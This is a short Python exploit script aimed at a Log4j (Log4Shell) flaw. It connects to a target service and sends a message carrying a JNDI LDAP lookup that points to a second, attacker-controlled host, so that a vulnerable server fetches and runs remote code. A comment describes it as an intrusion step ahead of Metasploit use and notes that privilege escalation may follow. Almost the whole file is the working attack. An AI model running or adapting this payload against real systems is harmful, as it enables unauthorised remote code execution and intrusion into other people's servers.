#!/usr/bin/env python3
import _thread
import socket
import os, sys

ip_con = "10.1.1.25"
#ip_con="127.0.0.1"
port_con = 1111


def send(s, msg : str) -> str:
    s.send(f"{msg}\n".encode('utf-8'))
    ret = str(s.recv(8192))
    return ret

# This hack can be used as an intrusion method for eventual metasploit usage later.
# Permissions are that of the running program, so escalation may be needed.
def do():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_con, port_con))
    
    print(send(s, "helloworld"))
    
    din = send(s, "reply to this. I am ${jndi:ldap://10.1.1.126:8000/a}")
    print(din)
    
    resp = send(s, b"break")
    print(resp)
    s.close()
do()
    
